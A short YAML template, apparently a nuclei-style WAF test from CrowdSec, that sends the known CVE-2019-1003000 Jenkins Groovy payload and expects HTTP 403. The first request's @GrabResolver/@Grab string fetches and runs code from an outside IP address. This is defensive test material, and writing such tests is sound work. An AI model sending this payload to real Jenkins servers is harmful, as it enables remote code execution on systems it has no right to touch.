id: CVE-2019-1003000
info:
  name: CVE-2019-1003000
  author: crowdsec
  severity: info
  description: CVE-2019-1003000 testing
  tags: appsec-testing
http:
#this is a dummy request, edit the request(s) to match your needs
  - raw:
    - |
      GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27orange.tw%27,%20root=%27http://45.55.211.79/%27)%0a@Grab(group=%27tw.orange%27,%20module=%27poc%27,%20version=%278%27)%0aimport%20Orange; HTTP/1.1
      Host: {{Hostname}}
  - raw:
    - |
      GET /securityRealm/user/admin/ HTTP/1.1
      Host: {{Hostname}}

    cookie-reuse: true
#test will fail because we won't match http status 
    matchers:
    - type: dsl
      condition: and
      dsl:
        - 'status_code_1 == 403'
        - 'status_code_2 == 403'
        - 'status_code_3 == 403'
